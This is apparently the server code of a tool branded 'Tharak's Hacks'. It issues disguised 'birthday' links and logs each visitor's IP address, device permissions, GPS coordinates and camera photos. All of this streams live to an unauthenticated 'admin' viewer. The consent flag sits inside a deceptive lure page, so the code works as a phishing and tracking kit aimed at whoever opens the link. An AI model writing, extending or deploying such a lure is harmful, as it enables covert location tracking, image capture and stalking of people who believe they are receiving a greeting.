const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = Number(process.env.PORT) || 3000;
const HOST = "0.0.0.0";
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, "data");
const PHOTO_DIR = path.join(DATA_DIR, "photos");
const SESSION_FILE = path.join(DATA_DIR, "sessions.json");

fs.mkdirSync(PHOTO_DIR, { recursive: true });

function loadSessions() {
  try {
    if (!fs.existsSync(SESSION_FILE)) return new Map();
    const raw = fs.readFileSync(SESSION_FILE, "utf8");
    const items = JSON.parse(raw);
    return new Map(items.map((item) => [item.id, item]));
  } catch (error) {
    console.error("Could not load sessions:", error.message);
    return new Map();
  }
}

let sessions = loadSessions();

function saveSessions() {
  const tempFile = SESSION_FILE + ".tmp";
  fs.writeFileSync(tempFile, JSON.stringify([...sessions.values()], null, 2));
  fs.renameSync(tempFile, SESSION_FILE);
}

function makeId() {
  return crypto.randomBytes(8).toString("hex");
}

function clientIp(req) {
  return (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown")
    .toString()
    .split(",")[0]
    .trim();
}

app.use(express.json({ limit: "8mb" }));
app.use(express.static(path.join(__dirname, "public")));

app.get("/health", (_req, res) => {
  res.json({ ok: true, service: "tharaks-hacks" });
});

app.post("/api/session", (_req, res) => {
  const id = makeId();
  const session = {
    id,
    createdAt: new Date().toISOString(),
    permissions: { camera: false, microphone: false, location: false },
    ip: null,
    location: null,
    automaticCaptureConsent: false,
    photos: []
  };

  sessions.set(id, session);
  saveSessions();
  res.json({ id, url: `/birthday/${id}` });
});

app.get("/birthday/:id", (req, res) => {
  if (!sessions.has(req.params.id)) return res.sendStatus(404);
  res.sendFile(path.join(__dirname, "public", "birthday.html"));
});

app.get("/api/session/:id", (req, res) => {
  const session = sessions.get(req.params.id);
  session ? res.json(session) : res.sendStatus(404);
});

io.on("connection", (socket) => {
  socket.on("participant:join", ({ sessionId }) => {
    const session = sessions.get(sessionId);
    if (!session) return;
    socket.join(`session:${sessionId}`);
    session.ip = clientIp(socket.request);
    saveSessions();
    io.to(`session:${sessionId}`).emit("session:update", session);
  });

  socket.on("participant:permissions", ({ sessionId, permissions }) => {
    const session = sessions.get(sessionId);
    if (!session) return;
    session.permissions = { ...session.permissions, ...permissions };
    saveSessions();
    io.to(`session:${sessionId}`).emit("session:update", session);
  });

  socket.on("participant:location", ({ sessionId, latitude, longitude }) => {
    const session = sessions.get(sessionId);
    if (!session) return;
    session.location = { latitude, longitude };
    saveSessions();
    io.to(`session:${sessionId}`).emit("session:update", session);
  });

  socket.on("participant:consent", ({ sessionId, automaticCapture }) => {
    const session = sessions.get(sessionId);
    if (!session) return;
    session.automaticCaptureConsent = !!automaticCapture;
    saveSessions();
    io.to(`session:${sessionId}`).emit("session:update", session);
  });

  socket.on("participant:photo", ({ sessionId, image }) => {
    const session = sessions.get(sessionId);
    if (!session || !session.automaticCaptureConsent) return;
    if (typeof image !== "string" || !image.startsWith("data:image/")) return;

    const comma = image.indexOf(",");
    if (comma === -1) return;

    const mime = image.slice(5, image.indexOf(";"));
    const extension = mime === "image/png" ? "png" : mime === "image/webp" ? "webp" : "jpg";
    const fileName = `${Date.now()}-${crypto.randomBytes(4).toString("hex")}.${extension}`;
    const filePath = path.join(PHOTO_DIR, fileName);

    try {
      fs.writeFileSync(filePath, Buffer.from(image.slice(comma + 1), "base64"));
      const photo = { fileName, capturedAt: new Date().toISOString() };
      session.photos.push(photo);
      saveSessions();
      io.to(`session:${sessionId}`).emit("photo:captured", photo);
      io.to(`session:${sessionId}`).emit("session:update", session);
    } catch (error) {
      console.error("Could not save photo:", error.message);
    }
  });

  socket.on("admin:join", ({ sessionId }) => {
    const session = sessions.get(sessionId);
    if (!session) return;
    socket.join(`session:${sessionId}`);
    socket.emit("session:update", session);
  });
});

app.get("/photo/:fileName", (req, res) => {
  const fileName = path.basename(req.params.fileName);
  const filePath = path.join(PHOTO_DIR, fileName);
  fs.existsSync(filePath) ? res.sendFile(filePath) : res.sendStatus(404);
});

server.listen(PORT, HOST, () => {
  console.log(`Tharak's Hacks: http://localhost:${PORT}`);
  console.log(`Listening on ${HOST}:${PORT}`);
});
